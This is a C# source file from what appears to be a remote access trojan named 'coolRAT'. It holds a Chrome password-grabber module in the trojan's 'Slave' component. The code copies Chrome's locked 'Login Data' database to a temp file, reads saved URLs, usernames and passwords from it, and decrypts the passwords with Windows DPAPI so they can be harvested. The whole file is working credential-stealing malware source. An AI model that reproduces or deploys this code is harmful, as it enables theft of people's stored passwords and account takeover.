using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using coolRAT.Libs.Password_Grabbers;
using System.Data.SQLite;

namespace coolRAT.Slave.Password_Grabbers
{
    public class ChromePassReader : IPassReader
    {
        public string BrowserName { get { return "Chrome"; } }
        private const string LoginDataPath = "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";

        private byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            const int CHUNK_SIZE = 2 * 1024;
            byte[] buffer = new byte[CHUNK_SIZE];
            long bytesRead;
            long fieldOffset = 0;
            using (MemoryStream stream = new MemoryStream())
            {
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }

        public string ForceUnlockDatabase()
        {
            string temp_file = Path.GetTempFileName();
            string databasePath = Path.GetFullPath(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + LoginDataPath);
            if (!File.Exists(databasePath)) return null;

            if (File.Exists(temp_file)) File.Delete(temp_file);
            File.Copy(databasePath, temp_file);
            return temp_file;
        }

        public IEnumerable<CredentialModel> ReadPasswords()
        {
            List<CredentialModel> result = new List<CredentialModel>();
            string tempDBPath = ForceUnlockDatabase();
            if (tempDBPath == null) return result;
            if (!File.Exists(tempDBPath)) return result;

            using(SQLiteConnection conn = new SQLiteConnection($"Data Source={tempDBPath};"))
            {
                conn.Open();
                using (SQLiteCommand cmd = conn.CreateCommand())
                {
                    cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                    using (SQLiteDataReader reader = cmd.ExecuteReader())
                    {
                        if (reader.HasRows)
                        {
                            while (reader.Read())
                            {
                                var pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader, 2), null, DataProtectionScope.CurrentUser));
                                CredentialModel credential = new CredentialModel()
                                {
                                    Url = reader.GetString(0),
                                    Username = reader.GetString(1),
                                    Password = pass
                                };

                                if (credential.Url == "" && credential.Username == "" && credential.Password == "") continue;
                                result.Add(credential);
                            }
                        }
                    }
                }
                conn.Close();
            }

            File.Delete(tempDBPath);
            return result;
        }
    }
}
